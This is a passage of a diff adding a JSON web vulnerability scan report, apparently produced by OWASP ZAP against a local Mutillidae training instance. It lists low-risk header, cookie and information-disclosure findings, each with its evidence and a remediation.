+					"reference": "<p>https://www.w3.org/TR/CSP/</p><p>https://caniuse.com/#search=content+security+policy</p><p>https://content-security-policy.com/</p><p>https://github.com/HtmlUnit/htmlunit-csp</p><p>https://web.dev/articles/csp#resource-options</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "525"
+				},
+				{
+					"pluginid": "10010",
+					"alertRef": "10010",
+					"alert": "Cookie No HttpOnly Flag",
+					"name": "Cookie No HttpOnly Flag",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.</p>",
+					"instances":[ 
+						{
+							"id": "12",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "PHPSESSID",
+							"attack": "",
+							"evidence": "Set-Cookie: PHPSESSID",
+							"otherinfo": ""
+						},
+						{
+							"id": "17",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "showhints",
+							"attack": "",
+							"evidence": "Set-Cookie: showhints",
+							"otherinfo": ""
+						},
+						{
+							"id": "201",
+							"uri": "http://host.docker.internal:25004/index.php?do=toggle-hints&page=/app/home.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (do,page)",
+							"method": "GET",
+							"param": "showhints",
+							"attack": "",
+							"evidence": "Set-Cookie: showhints",
+							"otherinfo": ""
+						}
+					],
+					"count": "3",
+					"systemic": false,
+					"solution": "<p>Ensure that the HttpOnly flag is set for all cookies.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://owasp.org/www-community/HttpOnly</p>",
+					"cweid": "1004",
+					"wascid": "13",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "10054",
+					"alertRef": "10054-1",
+					"alert": "Cookie without SameSite Attribute",
+					"name": "Cookie without SameSite Attribute",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>A cookie has been set without the SameSite attribute, which means that the cookie can be sent as a result of a 'cross-site' request. The SameSite attribute is an effective counter measure to cross-site request forgery, cross-site script inclusion, and timing attacks.</p>",
+					"instances":[ 
+						{
+							"id": "19",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "PHPSESSID",
+							"attack": "",
+							"evidence": "Set-Cookie: PHPSESSID",
+							"otherinfo": ""
+						},
+						{
+							"id": "20",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "showhints",
+							"attack": "",
+							"evidence": "Set-Cookie: showhints",
+							"otherinfo": ""
+						},
+						{
+							"id": "174",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "phpMyAdmin",
+							"attack": "",
+							"evidence": "Set-Cookie: phpMyAdmin",
+							"otherinfo": ""
+						},
+						{
+							"id": "179",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "pma_collation_connection",
+							"attack": "",
+							"evidence": "Set-Cookie: pma_collation_connection",
+							"otherinfo": ""
+						},
+						{
+							"id": "178",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "pma_lang",
+							"attack": "",
+							"evidence": "Set-Cookie: pma_lang",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-same-site</p>",
+					"cweid": "1275",
+					"wascid": "13",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-2",
+					"alert": "Cross-Origin-Embedder-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Embedder-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Embedder-Policy header is a response header that prevents a document from loading any cross-origin resources that don't explicitly grant the document permission (using CORP or CORS).</p>",
+					"instances":[ 
+						{
+							"id": "11",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "Cross-Origin-Embedder-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "61",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "Cross-Origin-Embedder-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "66",
+							"uri": "http://host.docker.internal:25004/documentation/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/",
+							"method": "GET",
+							"param": "Cross-Origin-Embedder-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "34",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "Cross-Origin-Embedder-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "62",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "Cross-Origin-Embedder-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Embedder-Policy header appropriately, and that it sets the Cross-Origin-Embedder-Policy header to 'require-corp' for documents.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Embedder-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-embedder-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-3",
+					"alert": "Cross-Origin-Opener-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Opener-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Opener-Policy header is a response header that allows a site to control if others included documents share the same browsing context. Sharing the same browsing context with untrusted documents might lead to data leak.</p>",
+					"instances":[ 
+						{
+							"id": "14",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "Cross-Origin-Opener-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "84",
+							"uri": "http://host.docker.internal:25004/classes/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/classes\/",
+							"method": "GET",
+							"param": "Cross-Origin-Opener-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "70",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "Cross-Origin-Opener-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "36",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "Cross-Origin-Opener-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "69",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "Cross-Origin-Opener-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Opener-Policy header appropriately, and that it sets the Cross-Origin-Opener-Policy header to 'same-origin' for documents.</p><p>'same-origin-allow-popups' is considered as less secured and should be avoided.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Opener-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-opener-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-1",
+					"alert": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.</p>",
+					"instances":[ 
+						{
+							"id": "10",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "58",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "32",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "57",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "4",
+							"uri": "http://host.docker.internal:25004/robots.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/robots.txt",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.</p><p>'same-site' is considered as less secured and should be avoided.</p><p>If resources must be shared, set the header to 'cross-origin'.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "10110",
+					"alertRef": "10110",
+					"alert": "Dangerous JS Functions",
+					"name": "Dangerous JS Functions",
+					"riskcode": "1",
+					"confidence": "1",
+					"riskdesc": "Low (Low)",
+					"desc": "<p>A dangerous JS function seems to be in use that would leave the site vulnerable.</p>",
+					"instances":[ 
+						{
+							"id": "335",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/functions.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/functions.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "386",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/gis_data_editor.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/gis_data_editor.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "361",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery-ui-1.8.16.custom.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery-ui-1.8.16.custom.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "337",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery-ui-1.8.16.custom.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery-ui-1.8.16.custom.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "360",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery.json-2.2.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery.json-2.2.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "362",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery.tablesorter.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery.tablesorter.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						},
+						{
+							"id": "385",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/timepicker.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/timepicker.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "eval(",
+							"otherinfo": ""
+						}
+					],
+					"count": "7",
+					"systemic": false,
+					"solution": "<p>See the references for security advice on the use of these functions.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://v17.angular.io/guide/security</p>",
+					"cweid": "749",
+					"wascid": "-1",
+					"sourceid": "2032"
+				},
+				{
+					"pluginid": "10009",
+					"alertRef": "10009",
+					"alert": "In Page Banner Information Leak",
+					"name": "In Page Banner Information Leak",
+					"riskcode": "1",
+					"confidence": "3",
+					"riskdesc": "Low (High)",
+					"desc": "<p>The server returned a version banner string in the response content. Such information leaks may allow attackers to further target specific issues impacting the product and version in use.</p>",
+					"instances":[ 
+						{
+							"id": "88",
+							"uri": "http://host.docker.internal:25004/config.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/config.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7",
+							"otherinfo": "There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body."
+						},
+						{
+							"id": "162",
+							"uri": "http://host.docker.internal:25004/documentation/images/pdf-icon-48-48.png",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/images\/pdf-icon-48-48.png",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7",
+							"otherinfo": "There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body."
+						},
+						{
+							"id": "159",
+							"uri": "http://host.docker.internal:25004/documentation/images/youtube-48-48.png",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/images\/youtube-48-48.png",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7",
+							"otherinfo": "There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body."
+						},
+						{
+							"id": "154",
+							"uri": "http://host.docker.internal:25004/documentation/index.php?page=./documentation/vulnerabilities.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7",
+							"otherinfo": "There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body."
+						},
+						{
+							"id": "13",
+							"uri": "http://host.docker.internal:25004/sitemap.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/sitemap.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Apache/2.4.7",
+							"otherinfo": "There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Configure the server to prevent such information leaks. For example:</p><p>Under Tomcat this is done via the \"server\" directive and implementation of custom error pages.</p><p>Under Apache this is done via the \"ServerSignature\" and \"ServerTokens\" directives.</p>",
+					"otherinfo": "<p>There is a chance that the highlight in the finding is on a value in the headers, versus the actual matched string in the response body.</p>",
+					"reference": "<p>https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/</p>",
+					"cweid": "497",
+					"wascid": "13",
+					"sourceid": "16"
+				},
+				{
+					"pluginid": "10023",
+					"alertRef": "10023",
+					"alert": "Information Disclosure - Debug Error Messages",
+					"name": "Information Disclosure - Debug Error Messages",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The response appeared to contain common error messages returned by platforms such as ASP.NET, and Web-servers such as IIS and Apache. You can configure the list of common debug messages.</p>",
+					"instances":[ 
+						{
+							"id": "177",
+							"uri": "http://host.docker.internal:25004/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "PHP error",
+							"otherinfo": ""
+						},
+						{
+							"id": "187",
+							"uri": "http://host.docker.internal:25004/documentation/change-log.html",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/change-log.html",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "php error",
+							"otherinfo": ""
+						},
+						{
+							"id": "188",
+							"uri": "http://host.docker.internal:25004/index.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "PHP error",
+							"otherinfo": ""
+						},
+						{
+							"id": "200",
+							"uri": "http://host.docker.internal:25004/index.php?page=home.php&popUpNotificationCode=HPH0",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page,popUpNotificationCode)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "PHP error",
+							"otherinfo": ""
+						},
+						{
+							"id": "180",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/lib/apache-log4php/site/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/lib\/apache-log4php\/site\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "PHP error",
+							"otherinfo": ""
+						},
+						{
+							"id": "322",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/Documentation.html",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/Documentation.html",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Internal Server Error",
+							"otherinfo": ""
+						},
+						{
+							"id": "371",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/url.php?token=e415c9425c5cbf8477d80e5bb28fe9cb&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fdrop-database.html",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/url.php (token,url)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						},
+						{
+							"id": "372",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(Alter_priv,Alter_routine_priv,Create_priv,Create_routine_priv,Create_tmp_table_priv,Create_user_priv,Create_view_priv,Delete_priv,Drop_priv,Event_priv,Execute_priv,File_priv,Grant_priv,Index_priv,Insert_priv,Lock_tables_priv,Process_priv,References_priv,Reload_priv,Repl_client_priv,Repl_slave_priv,Select_priv,Show_db_priv,Show_view_priv,Shutdown_priv,Super_priv,Trigger_priv,Update_priv,grant_count,hostname,max_connections,max_questions,max_updates,max_user_connections,token,update_privs,username)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						},
+						{
+							"id": "374",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(change_copy,hostname,mode,old_hostname,old_username,pma_pw,pma_pw2,pred_hostname,pred_password,pred_username,token,username)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						},
+						{
+							"id": "370",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(change_pw,hostname,nopass,pma_pw,pma_pw2,pw_hash,token,username)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						},
+						{
+							"id": "369",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/server_privileges.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/server_privileges.php ()(dbname,hostname,pred_dbname,token,username)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						},
+						{
+							"id": "375",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/sql.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/sql.php ()(sql_query,token)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "Access denied for user",
+							"otherinfo": ""
+						}
+					],
+					"count": "12",
+					"systemic": false,
+					"solution": "<p>Disable debugging messages before pushing to production.</p>",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "1295",
+					"wascid": "13",
+					"sourceid": "352"
+				},
+				{
+					"pluginid": "10063",
+					"alertRef": "10063-1",
+					"alert": "Permissions Policy Header Not Set",
+					"name": "Permissions Policy Header Not Set",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Permissions Policy Header is an added layer of security that helps to restrict from unauthorized access or usage of browser/client features by web resources. This policy ensures the user privacy by limiting or specifying the features of the browsers can be used by the web resources. Permissions Policy provides a set of standard HTTP headers that allow website owners to limit which features of browsers can be used by the page such as camera, microphone, location, full screen etc.</p>",
+					"instances":[ 
+						{
+							"id": "8",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "31",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "48",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "54",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "3",
+							"uri": "http://host.docker.internal:25004/sitemap.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/sitemap.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is configured to set the Permissions-Policy header.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy</p><p>https://developer.chrome.com/blog/feature-policy/</p><p>https://scotthelme.co.uk/a-new-security-header-feature-policy/</p><p>https://w3c.github.io/webappsec-feature-policy/</p><p>https://www.smashingmagazine.com/2018/12/feature-policy/</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "2",
+					"alertRef": "2",
+					"alert": "Private IP Disclosure",
+					"name": "Private IP Disclosure",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems.</p>",
+					"instances":[ 
+						{
+							"id": "146",
+							"uri": "http://host.docker.internal:25004/documentation/Mutillidae-Test-Scripts.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/Mutillidae-Test-Scripts.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "192.168.56.103",
+							"otherinfo": "192.168.56.103\n192.168.56.101\n192.168.56.101\n192.168.56.101\n192.168.56.102\n192.168.56.102\n192.168.1.1\n192.168.56.101\n"
+						},
+						{
+							"id": "142",
+							"uri": "http://host.docker.internal:25004/documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "192.168.56.0",
+							"otherinfo": "192.168.56.0\n192.168.56.0\n192.168.0.0\n"
+						},
+						{
+							"id": "183",
+							"uri": "http://host.docker.internal:25004/documentation/mutillidae-demo.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/mutillidae-demo.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "192.168.56.101",
+							"otherinfo": "192.168.56.101\n"
+						},
+						{
+							"id": "293",
+							"uri": "http://host.docker.internal:25004/hints-page-wrapper.php?level1HintIncludeFile=54",
+							"nodeName": "http:\/\/host.docker.internal:25004\/hints-page-wrapper.php (level1HintIncludeFile)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "10.0.0.133",
+							"otherinfo": "10.0.0.133\n10.0.0.255\n172.16.0.248\n172.16.0.255\n"
+						},
+						{
+							"id": "298",
+							"uri": "http://host.docker.internal:25004/hints-page-wrapper.php?level1HintIncludeFile=55",
+							"nodeName": "http:\/\/host.docker.internal:25004\/hints-page-wrapper.php (level1HintIncludeFile)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "10.0.0.1:3000",
+							"otherinfo": "10.0.0.1:3000\n"
+						},
+						{
+							"id": "326",
+							"uri": "http://host.docker.internal:25004/hints-page-wrapper.php?level1HintIncludeFile=53",
+							"nodeName": "http:\/\/host.docker.internal:25004\/hints-page-wrapper.php (level1HintIncludeFile)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "192.168.56.102",
+							"otherinfo": "192.168.56.102\n192.168.56.102\n192.168.56.102\n192.168.56.102\n192.168.56.101\n192.168.56.102\n192.168.56.102:5123\n"
+						},
+						{
+							"id": "321",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/Documentation.html",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/Documentation.html",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "10.0.0.0",
+							"otherinfo": "10.0.0.0\n192.168.0.0\n172.16.0.0\n"
+						}
+					],
+					"count": "7",
+					"systemic": false,
+					"solution": "<p>Remove the private IP address from the HTTP response body. For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers.</p>",
+					"otherinfo": "<p>192.168.56.103</p><p>192.168.56.101</p><p>192.168.56.101</p><p>192.168.56.101</p><p>192.168.56.102</p><p>192.168.56.102</p><p>192.168.1.1</p><p>192.168.56.101</p><p></p>",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc1918</p>",
+					"cweid": "497",
+					"wascid": "13",
+					"sourceid": "155"
+				},
+				{
+					"pluginid": "10037",
+					"alertRef": "10037",
+					"alert": "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)",
+					"name": "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The web/application server is leaking information via one or more \"X-Powered-By\" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.</p>",
+					"instances":[ 
+						{
+							"id": "23",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "X-Powered-By: PHP/5.5.9-1ubuntu4.25",
+							"otherinfo": ""
+						},
+						{
+							"id": "147",
